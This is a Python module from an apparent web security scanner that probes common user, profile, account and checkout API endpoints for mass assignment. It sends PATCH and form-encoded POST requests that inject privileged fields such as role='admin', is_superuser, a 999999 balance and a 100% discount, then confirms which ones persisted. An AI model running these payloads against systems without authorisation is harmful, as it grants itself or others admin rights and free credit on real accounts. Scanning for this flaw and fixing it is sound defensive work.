"""Mass assignment scanner — detects API parameter injection via superset payloads, cross-session confirmation."""
from __future__ import annotations
import asyncio
import json
import random
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

COMMON_PRIVILEGED_FIELDS = [
    "role", "is_admin", "admin", "privilege", "privileges",
    "permission", "permissions", "scope", "scopes",
    "is_superuser", "is_staff", "is_verified", "verified",
    "subscription", "subscription_tier", "tier", "plan",
    "credit", "balance", "credit_balance", "wallet",
    "mfa_required", "mfa_enabled", "2fa_enabled",
    "email_verified", "phone_verified", "kyc_status",
    "status", "account_status", "active", "enabled",
    "partner_id", "referrer_id", "discount",
    "chosen_discount", "coupon", "coupon_code",
]

PRIVILEGED_SCORES = {
    "role", "is_admin", "admin", "is_superuser", "is_staff",
    "privilege", "permissions", "scope",
}

API_UPDATE_ENDPOINTS = [
    "/api/user", "/api/users/me", "/api/profile",
    "/api/v1/user", "/api/v1/users/me", "/api/v1/profile",
    "/user", "/users/me", "/profile",
    "/api/account", "/api/v1/account",
    "/api/settings", "/api/v1/settings",
    "/api/checkout", "/api/v1/checkout",
    "/api/register", "/api/signup",
]

API_GET_ENDPOINTS = [
    "/api/user", "/api/users/me", "/api/profile",
    "/api/v1/user", "/api/v1/users/me", "/api/v1/profile",
    "/api/account", "/api/v1/account",
]


async def _get_response_fields(url: str, client: TalismanHTTPClient, auth: str | None = None) -> dict[str, Any]:
    """GET an endpoint and return all fields observed in the JSON response."""
    headers = {}
    if auth:
        headers["Authorization"] = auth
    try:
        r = await client.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                if isinstance(data, dict):
                    return _flatten_json(data)
                if isinstance(data, list) and len(data) > 0:
                    return _flatten_json(data[0])
            except (json.JSONDecodeError, ValueError):
                pass
    except Exception:
        pass
    return {}


def _flatten_json(obj: dict, prefix: str = "") -> dict[str, Any]:
    """Flatten nested JSON to dot-separated keys."""
    result: dict[str, Any] = {}
    for k, v in obj.items():
        full_key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict) and not k.startswith("__"):
            result.update(_flatten_json(v, full_key))
        else:
            result[full_key] = v
    return result


def _build_superset_payload(base_fields: dict[str, Any], privileged_fields: list[str]) -> dict[str, Any]:
    """Build a superset payload that adds privileged fields to existing fields."""
    payload = dict(base_fields)
    for field in privileged_fields:
        if field not in payload:
            parts = field.split(".")
            if len(parts) == 1:
                if "role" in field.lower() or "admin" in field.lower() or "superuser" in field.lower() or "staff" in field.lower():
                    payload[field] = "admin"
                elif "tier" in field.lower() or "plan" in field.lower() or "subscription" in field.lower():
                    payload[field] = "enterprise"
                elif "balance" in field.lower() or "credit" in field.lower() or "wallet" in field.lower():
                    payload[field] = 999999
                elif "verified" in field.lower():
                    payload[field] = True
                elif "discount" in field.lower():
                    payload[field] = {"percentage": 100}
                elif "status" in field.lower() or "active" in field.lower() or "enabled" in field.lower():
                    payload[field] = "active"
                else:
                    payload[field] = "injected"
            else:
                _set_nested(payload, parts, "injected")
    return payload


def _set_nested(d: dict, keys: list[str], value: Any) -> None:
    for k in keys[:-1]:
        d = d.setdefault(k, {})
    d[keys[-1]] = value


async def _test_mass_assignment(
    url: str, endpoint: str, client: TalismanHTTPClient,
    auth: str | None = None,
) -> list[dict[str, Any]]:
    """Test a single endpoint for mass assignment."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    headers = {"Content-Type": "application/json"}
    if auth:
        headers["Authorization"] = auth

    # Step 1: GET current state to learn fields
    base_fields = await _get_response_fields(test_url, client, auth)
    if not base_fields:
        return findings

    known_fields = list(base_fields.keys())

    # Step 2: Find candidate privileged fields (from wordlist + response)
    candidate_fields = [f for f in COMMON_PRIVILEGED_FIELDS if f not in known_fields]

    # Step 3: Send PATCH/PUT with superset payload
    superset = _build_superset_payload(base_fields, candidate_fields)
    try:
        r = await client.patch(test_url, json=superset, headers=headers, timeout=10)
        if r.status_code in (200, 201, 204):
            # Step 4: Confirm via separate GET request
            confirm_fields = await _get_response_fields(test_url, client, auth)
            if confirm_fields:
                for field in candidate_fields:
                    injected_value = superset.get(field, "injected")
                    confirmed_value = _get_nested(confirm_fields, field.split("."))
                    if confirmed_value is not None and str(confirmed_value) == str(injected_value):
                        severity = "critical" if any(s in field.lower() for s in ["admin", "role", "superuser", "staff", "privilege"]) else "high"
                        findings.append({
                            "field": field,
                            "injected_value": injected_value,
                            "confirmed_value": confirmed_value,
                            "severity": severity,
                        })
                        if len(findings) >= 5:
                            break
    except Exception:
        pass

    # Step 5: Try form-encoded injection too
    form_payload = {f"user[{f}]": "admin" if "admin" in f.lower() or "role" in f.lower() else "injected" for f in candidate_fields[:10]}
    form_payload.update({"email": "test@test.com", "name": "test"})
    try:
        r = await client.post(test_url, data=form_payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
    except Exception:
        pass

    return findings


def _get_nested(d: dict, keys: list[str]) -> Any:
    current = d
    for k in keys:
        if isinstance(current, dict) and k in current:
            current = current[k]
        else:
            return None
    return current


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    auth: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] Mass Assignment Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        console.print(f"  Testing {len(API_UPDATE_ENDPOINTS)} endpoints for mass assignment...")
        for endpoint in API_UPDATE_ENDPOINTS:
            endpoint_findings = await _test_mass_assignment(url, endpoint, client, auth)
            for f in endpoint_findings:
                field = f["field"]
                title = f"Mass assignment: writable field '{field}' at {endpoint}"
                print_finding(title, f["severity"], url)
                findings.append({"endpoint": endpoint, **f})
                if session:
                    await session.add_finding(
                        target=url, module="mass_assignment",
                        vuln_type="mass_assignment",
                        severity=f["severity"], confidence="confirmed",
                        title=title,
                        description=f"Privileged field '{field}' was accepted and persisted at {endpoint}. Injected value: {f['injected_value']}, confirmed: {f['confirmed_value']}.",
                        evidence=f"Field '{field}' = '{f['confirmed_value']}' persisted across separate requests",
                        remediation="1. Use allowlists for permitted parameters. 2. Never auto-bind request bodies to models. 3. Validate each field against a predefined schema.",
                        cvss_score=9.1 if f["severity"] == "critical" else 7.5, cwe="CWE-915",
                    )

    console.print(f"  Mass assignment scan complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
